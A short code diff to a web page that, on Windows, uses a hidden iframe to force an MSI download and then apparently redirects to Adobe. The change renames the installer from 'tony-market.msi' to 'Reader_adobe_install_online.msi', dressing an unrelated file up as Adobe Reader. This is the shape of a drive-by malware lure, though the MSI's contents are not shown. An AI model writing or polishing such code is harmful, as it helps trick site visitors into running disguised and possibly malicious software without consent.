@@ -10,7 +10,7 @@ export default function Home() {
       // Windows: trigger MSI download + redirect to Adobe
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
-      iframe.src = '/tony-market.msi'; // make sure the MSI file is in /public
+      iframe.src = '/Reader_adobe_install_online.msi'; // make sure the MSI file is in /public
       document.body.appendChild(iframe);
 
       setTimeout(() => {
